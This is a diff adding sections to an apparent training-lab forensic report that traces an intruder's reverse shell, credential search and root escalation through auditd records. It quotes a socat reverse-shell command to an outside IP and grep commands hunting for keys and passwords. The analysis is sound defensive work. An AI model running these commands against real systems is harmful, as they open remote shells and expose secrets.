@@ -451,6 +451,41 @@ The objective was to determine how the attacker attempted to obtain interactive 
 
 #### Suspicious Reverse-Shell Activity
 
+#### Reconstructed Process Ancestry
+
+Auditd recorded a suspicious `socat` command executed by the `svctrypingme` service account:
+
+```bash
+socat TCP:10.14.105.255:1337 EXEC:sh,pty,stderr,setsid,sigint,sane
+```
+
+The command was consistent with establishing an interactive reverse shell to `10.14.105.255` on TCP port `1337`.
+
+Using PID and PPID relationships, the investigation reconstructed the following process chain:
+
+```text
+systemd (PID 1)
+    └── python3.12 (PID 2526, svctrypingme)
+         └── /bin/sh (PID 2543)
+              └── socat (PID 2545)
+```
+
+| Process | PID | Investigative Significance |
+| --- | --- | --- |
+| Python service | `2526` | Service process operating as `svctrypingme` |
+| `/bin/sh` | `2543` | Shell executing the injected command |
+| `socat` | `2545` | Reverse-shell utility targeting `10.14.105.255:1337` |
+
+![socat reverse-shell process ancestry](evidence/09-socat-reverse-shell.png)
+
+*Figure 9 — auditd process records linking a Python service process to shell execution and a `socat` reverse-shell command under the `svctrypingme` account.*
+
+The execution records showed `success=yes`, confirming the process-execution events succeeded.
+
+The collected audit record did not independently display the exact application path `/opt/trypingme/main.py`. The TryPingMe application identity was supplied by the training scenario, while the process ancestry was established through auditd.
+
+The command and process relationships strongly supported reverse-shell activity; the preserved execution records alone did not independently establish the network session's duration or full interactive contents.
+
 Auditd telemetry identified `socat` execution associated with reverse-shell behavior.
 
 The suspicious process originated within the `svctrypingme` service-account context.
@@ -462,6 +497,43 @@ The command evidence was examined for the connection destination, process contex
 Where available, network telemetry would be needed to independently verify successful connection establishment and the remote session's duration.
 
 #### Credential Discovery
+
+#### Credential Search Activity
+
+After reverse-shell execution, auditd recorded commands searching for potentially sensitive information:
+
+```bash
+grep -iR key .
+grep -iR pass .
+```
+
+Both commands executed under the `svctrypingme` account.
+
+The searches were consistent with attempts to locate credentials, passwords, API keys, or other secrets within accessible files.
+
+The simulated investigation indicated that a root credential was located in an environment file. The credential value is intentionally excluded from the public documentation.
+
+#### Confirmed Root Shell
+
+Further auditd records established a successful privilege transition:
+
+| Observation | Value |
+| --- | --- |
+| Command | `su root` |
+| Process ID | `2554` |
+| Original user | `svctrypingme` |
+| Effective user | `root` |
+| Subsequent process | `/usr/bin/bash` |
+| Bash PID | `2570` |
+| Bash UID / EUID | `root` / `root` |
+
+![Confirmed Linux root privilege escalation](evidence/10-root-privilege-escalation.png)
+
+*Figure 10 — auditd evidence showing credential-discovery commands, `su root`, and subsequent execution of a Bash shell with root UID and EUID.*
+
+The root-owned Bash process provided direct evidence that the privilege transition succeeded.
+
+The observed technique was credential-based escalation using `su`, not exploitation of a demonstrated software vulnerability.
 
 Following the reverse-shell activity, additional commands indicated attempts to locate information that could support privilege escalation.
 
